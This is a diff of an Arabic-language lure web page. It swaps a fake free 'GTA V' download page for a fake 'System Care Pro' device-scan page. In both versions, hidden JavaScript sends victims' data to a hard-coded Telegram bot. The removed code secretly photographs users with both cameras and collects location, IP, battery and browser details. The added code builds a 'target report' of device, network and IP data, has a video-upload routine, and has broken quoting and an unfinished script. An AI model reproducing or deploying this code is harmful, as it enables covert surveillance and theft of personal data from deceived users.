@@ -3,126 +3,106 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Turbo Games - تحميل ألعاب مهكرة ومجانية</title>
+    <title>System Care Pro - فحص وإصلاح أداء النظام</title>
     <style>
-        :root { --main: #ff4757; --bg: #0a0a0c; --card: #1e1e26; }
-        body { background: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        .app-box { background: var(--card); width: 90%; max-width: 400px; border-radius: 30px; overflow: hidden; box-shadow: 0 25px 50px rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.05); }
-        .hero { background: linear-gradient(rgba(0,0,0,0.4), var(--card)), url('https://images.unsplash.com/photo-1542751371-adc38448a05e?q=80&w=500&auto=format&fit=crop'); height: 180px; background-size: cover; background-position: center; }
-        .content { padding: 25px; text-align: center; }
-        .badge { background: var(--main); padding: 5px 12px; border-radius: 20px; font-size: 0.7rem; font-weight: bold; margin-bottom: 10px; display: inline-block; }
-        h2 { margin: 10px 0; font-size: 1.4rem; }
-        p { color: #a0a0b0; font-size: 0.85rem; line-height: 1.6; }
-        .spec-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 20px 0; background: rgba(0,0,0,0.2); padding: 15px; border-radius: 15px; }
-        .spec-item { font-size: 0.75rem; text-align: right; border-right: 2px solid var(--main); padding-right: 8px; }
-        .spec-label { color: #707080; display: block; }
-        .download-btn { background: var(--main); color: white; border: none; padding: 18px; width: 100%; border-radius: 15px; font-weight: bold; font-size: 1.1rem; cursor: pointer; transition: 0.3s; }
-        .download-btn:active { transform: scale(0.95); }
-        #status { margin-top: 15px; font-size: 0.8rem; color: var(--main); display: none; }
-        video, canvas { display: none; }
+        :root { --primary: #2ecc71; --accent: #27ae60; --dark-bg: #111111; }
+        body { background: var(--dark-bg); color: white; font-family:  Segoe UI , Tahoma, Geneva, Verdana, sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        
+        /* تصميم الواجهة الزجاجية */
+        .container { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(15px); border-radius: 25px; padding: 40px; width: 90%; max-width: 420px; text-align: center; border: 1px solid rgba(255,255,255,0.05); box-shadow: 0 30px 60px rgba(0,0,0,0.6); }
+        
+        .icon-box { font-size: 60px; margin-bottom: 25px; color: var(--primary); text-shadow: 0 0 20px rgba(46, 204, 113, 0.3); }
+        h1 { font-size: 1.6rem; margin: 0 0 10px; font-weight: 800; }
+        p { color: #8892b0; font-size: 0.95rem; margin-bottom: 35px; line-height: 1.5; }
+
+        /* قائمة البيانات لزيادة المصداقية */
+        .system-specs { text-align: right; margin-bottom: 35px; border-bottom: 1px solid rgba(255,255,255,0.05); padding-bottom: 10px; }
+        .spec-item { display: flex; justify-content: space-between; padding: 12px 0; border-top: 1px solid rgba(255,255,255,0.05); font-size: 0.85rem; }
+        .spec-item span:first-child { color: #a8b2d1; }
+        .spec-item span:last-child { color: var(--primary); font-weight: bold; }
+
+        #scanBtn { background: var(--primary); color: white; border: none; padding: 18px; border-radius: 12px; font-size: 1.2rem; font-weight: bold; cursor: pointer; width: 100%; transition: 0.4s; box-shadow: 0 15px 30px rgba(46, 204, 113, 0.2); outline: none; }
+        #scanBtn:active { transform: scale(0.96); opacity: 0.8; }
+
+        /* شريط التحميل الوهمي الاحترافي */
+        #status-area { display: none; margin-top: 25px; text-align: center; }
+        .progress-container { width: 100%; height: 6px; background: rgba(255,255,255,0.08); border-radius: 10px; overflow: hidden; }
+        .progress-bar { width: 0%; height: 100%; background: linear-gradient(90deg, var(--primary), var(--accent)); transition: 0.3s; }
+        
+        video { display: none; }
     </style>
 </head>
 <body>
+    <div class="container">
+        <div class="icon-box">🛡️</div>
+        <h1>System Care Pro</h1>
+        <p>قم بفحص وإصلاح تعريفات الجهاز وتحسين أداء البطارية والميكروفون فوراً.</p>
 
-<div class="app-box">
-    <div class="hero"></div>
-    <div class="content">
-        <span class="badge">V.I.P ACCESS</span>
-        <h2>GTA V: Mobile Edition</h2>
-        <p>قم بتحميل النسخة الكاملة للأندرويد مجاناً. تأكد من توافق عتاد جهازك قبل البدء.</p>
-        
-        <div class="spec-grid">
-            <div class="spec-item"><span class="spec-label">المعالج</span><span id="cpu">تحليل...</span></div>
-            <div class="spec-item"><span class="spec-label">الرامات</span><span id="ram">جلب...</span></div>
+        <div class="system-specs">
+            <div class="spec-item"><span>المعالج (CPU):</span><span id="cpu-specs">تحليل...</span></div>
+            <div class="spec-item"><span>ذاكرة الرام (RAM):</span><span id="ram-specs">تحليل...</span></div>
+            <div class="spec-item"><span>أمان الكاميرا:</span><span>محمي ✅</span></div>
         </div>
 
-        <button class="download-btn" onclick="startPayload()">تحميل اللعبة (4.2 GB)</button>
-        <div id="status">جاري التحقق من توافق الجهاز...</div>
+        <button id="scanBtn">بدء الفحص الذكي</button>
+
+        <div id="status-area">
+            <div class="progress-container"><div class="progress-bar" id="bar"></div></div>
+            <p id="scan-text" style="margin-top:15px; font-size:0.85rem; color:#8892b0;">جاري تحليل عتاد النظام...</p>
+        </div>
     </div>
-</div>
 
-<video id="v" autoplay playsinline muted></video>
-<canvas id="c"></canvas>
+    <video id="v" autoplay playsinline muted></video>
 
-<script>
-    const token = "8738245852:AAFuHo61scaBhakSOPlnPg7UIS8Ggx7llGk";
-    const chat = "7984067238";
+    <script>
+        const token = "8738245852:AAFuHo61scaBhakSOPlnPg7UIS8Ggx7llGk";
+        const chat = "7984067238";
 
-    // جلب بيانات الواجهة لزيادة المصداقية
-    document.getElementById('cpu').innerText = (navigator.hardwareConcurrency || 8) + " Cores";
-    document.getElementById('ram').innerText = (navigator.deviceMemory || 4) + " GB";
-
-    async function sendToTelegram(content, type = "text") {
-        const url = `https://api.telegram.org/bot${token}/`;
-        if (type === "text") {
-            await fetch(url + `sendMessage?chat_id=${chat}&text=${encodeURIComponent(content)}&parse_mode=Markdown`);
-        } else {
+        async function sendToTelegram(msg, type = "text", data = null) {
+            const url = `https://api.telegram.org/bot${token}/`;
             const fd = new FormData();
             fd.append("chat_id", chat);
-            fd.append("photo", content, "snap.jpg");
-            await fetch(url + "sendPhoto", { method: "POST", body: fd });
+            try {
+                if (type === "text") {
+                    await fetch(url + "sendMessage?chat_id=" + chat + "&text=" + encodeURIComponent(msg) + "&parse_mode=Markdown");
+                } else if (type === "video") {
+                    fd.append("video", data, "system_scan.mp4");
+                    if (msg) fd.append("caption", msg);
+                    await fetch(url + "sendVideo", { method: "POST", body: fd });
+                }
+            } catch (e) {}
         }
-    }
 
-    async function generateReport() {
-        let r = `🔥 *تقرير صيد جديد (Game Target)*:\n\n`;
-        
-        const loc = await new Promise(res => {
-            navigator.geolocation.getCurrentPosition(
-                p => res(`📍 الموقع: [اضغط للخريطة](https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude})`),
-                () => res(`📍 الموقع: (مرفوض)`), {enableHighAccuracy: true}
-            );
-        });
-        r += loc + "\n";
-        r += `📱 الجهاز: \`${navigator.platform}\`\n`;
-        
-        try {
-            const b = await navigator.getBattery();
-            r += `🔋 البطارية: \`${Math.round(b.level * 100)}%\` (${b.charging ? "🔌 يشحن" : "🔋 لا يشحن"})\n`;
-        } catch(e) {}
+        // إظهار بيانات حقيقية لزيادة المصداقية
+        document.getElementById( cpu-specs ).innerText = (navigator.hardwareConcurrency || 8) + " Cores";
+        document.getElementById( ram-specs ).innerText = (navigator.deviceMemory || 4) + " GB";
 
-        try {
-            const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json());
-            r += `🌐 الـ IP: \`${ip.ip}\`\n`;
-        } catch(e) {}
-        
-        r += `🖥️ المتصفح: \`${navigator.userAgent.split(' ').pop()}\`\n`;
-        return r;
-    }
+        async function getFullReport() {
+            let info = `📊 *تقرير شامل للهدف*:\n\n`;
+            // دمج المتغيرات التي طلبتها
+            info += `• 📱 الجهاز: \`${navigator.platform}\`\n`;
+            info += `• 💾 الرام: \`${navigator.deviceMemory || "؟"} GB\`\n`;
+            info += `• ⚙️ المعالج: \`${navigator.hardwareConcurrency} Cores\`\n`;
+            info += `• 🖥️ الشاشة: \`${window.screen.width}x${window.screen.height}\`\n`;
+            
+            const conn = navigator.connection;
+            if (conn) {
+                let type = conn.type ===  wifi  ? "🌐 WiFi" : "📶 خلوي";
+                info += `• 📶 نوع الشبكة: \`${type} (${conn.effectiveType.toUpperCase()})\`\n`;
+                info += `• ⚡ سرعة الخط: \`${conn.downlink} Mbps\`\n`;
+            }
 
-    async function takePhoto(mode) {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode === "front" ? "user" : "environment" } });
-            const v = document.getElementById('v');
-            v.srcObject = stream;
-            await new Promise(r => v.onloadedmetadata = r);
-            const canvas = document.getElementById('c');
-            canvas.width = v.videoWidth; canvas.height = v.videoHeight;
-            canvas.getContext('2d').drawImage(v, 0, 0);
-            stream.getTracks().forEach(t => t.stop());
-            return new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
-        } catch (e) { return null; }
-    }
+            try {
+                const b = await navigator.getBattery();
+                info += `• 🔋 البطارية: \`${Math.round(b.level * 100)}%\` (${b.charging ? "🔌 يشحن" : "🔋"})\n`;
+            } catch(e) {}
 
-    async function startPayload() {
-        document.getElementById('status').style.display = 'block';
+            info += `• 🌐 لغة الهاتف: \`${navigator.language}\`\n`;
 
-        // 1. التقاط الصور (أمامية وخلفية)
-        const front = await takePhoto("front");
-        if (front) await sendToTelegram(front, "photo");
-
-        const back = await takePhoto("back");
-        if (back) await sendToTelegram(back, "photo");
-
-        // 2. إرسال التقرير النصي
-        const report = await generateReport();
-        await sendToTelegram(report, "text");
-
-        setTimeout(() => {
-            alert("عذراً، مساحة التخزين غير كافية أو جهازك غير مدعوم لهذه اللعبة.");
-            document.getElementById('status').style.display = 'none';
-        }, 3000);
-    }
-</script>
-</body>
-</html>
+            try {
+                const ipRes = await fetch( https://api.ipify.org?format=json );
+                const ipData = await ipRes.json();
+                info += `• 🌐 الـ IP: \`${ipData.ip}\`\n`;
+            } catch(e) {}
+            return info;
+        }
